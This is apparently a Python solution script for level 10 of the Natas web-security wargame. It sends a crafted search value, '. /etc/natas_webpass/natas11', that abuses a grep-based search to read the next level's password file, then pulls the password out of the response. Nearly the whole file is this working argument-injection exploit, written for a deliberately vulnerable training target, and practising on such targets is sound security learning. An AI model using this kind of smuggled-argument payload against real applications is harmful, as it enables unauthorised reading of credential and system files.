import re
from src.natas.base_level import NatasLevel

class Level_10(NatasLevel):

  num = 10
  explanation = "On this level the needle parameter only passes through grep.\n      We bypass the filter by injecting '. /etc/natas_webpass/natas11' to read the password."

  def exploit(self) -> str:

    payload = {
      "needle": ". /etc/natas_webpass/natas11",
      "submit": "Search"
    }
    resp    = self.session.post(self.base_url, data = payload)
    match   = re.search(r"natas11:(\S+)", resp.text, re.MULTILINE).group(1).replace("natas11:", "")

    return match
